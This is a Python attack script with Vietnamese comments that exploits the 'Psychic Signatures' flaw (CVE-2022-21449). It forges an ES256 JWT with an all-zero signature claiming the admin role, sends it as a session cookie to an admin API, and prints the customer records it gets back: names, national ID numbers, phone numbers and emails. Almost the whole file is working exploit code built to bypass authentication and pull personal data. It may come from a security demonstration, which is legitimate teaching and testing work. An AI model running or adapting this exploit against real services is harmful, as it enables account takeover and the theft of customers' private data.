"""TẤN CÔNG 2 — PSYCHIC SIGNATURES / CVE-2022-21449 (qua HTTP, API công khai thật).

Chế tạo token phiên với chữ ký RỖNG (r=0, s=0). Hàm xác minh token của server bỏ
bước kiểm tra r,s ∈ [1,n-1] nên chấp nhận → chiếm quyền admin, bung toàn bộ hồ sơ
khách hàng (CCCD, SĐT, email) mà KHÔNG cần mật khẩu.

    python attack_psychic.py
"""
import json

from common import banner, step, info, ok, bad, impact, get, b64u


def forge_admin_token():
    header = {"alg": "ES256", "typ": "JWT"}
    payload = {"user": "attacker", "role": "admin"}
    h = b64u(json.dumps(header, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64u(b"\x00" * 64)                 # r = s = 0
    return f"{h}.{p}.{sig}"


def main():
    banner("TẤN CÔNG 2 — PSYCHIC SIGNATURES  →  chiếm admin, lộ toàn bộ PII")

    step(1, "Thử GET /api/admin/users KHI CHƯA có token")
    st, _ = get("/api/admin/users")
    info("HTTP status", st)
    ok("Bị từ chối như mong đợi") if st != 200 else bad("(?) vào được")

    step(2, "Chế tạo token admin với chữ ký RỖNG (r=0, s=0)")
    token = forge_admin_token()
    info("Token giả", token)

    step(3, "Gửi lại request kèm token giả (cookie session_token)")
    st, res = get("/api/admin/users", cookie=f"session_token={token}")
    info("HTTP status", st)
    if st != 200 or not isinstance(res, dict):
        return bad("Không vượt qua được xác thực.")

    accts = res["accounts"]
    ok(f"CHIẾM QUYỀN ADMIN — trích xuất {len(accts)} hồ sơ khách hàng")
    print(f"\n    {'Tài khoản':<12}{'Họ tên':<20}{'CCCD':<14}{'Điện thoại':<12}Email")
    print("    " + "-" * 74)
    for a in accts[:8]:
        print(f"    {a['user']:<12}{a.get('name',''):<20}{a.get('cccd',''):<14}"
              f"{a.get('phone',''):<12}{a.get('email','')}")
    if len(accts) > 8:
        print(f"    … và {len(accts) - 8} hồ sơ khác")

    impact(f"Rò rỉ PII của toàn bộ {len(accts)} khách hàng, không cần mật khẩu")


if __name__ == "__main__":
    main()
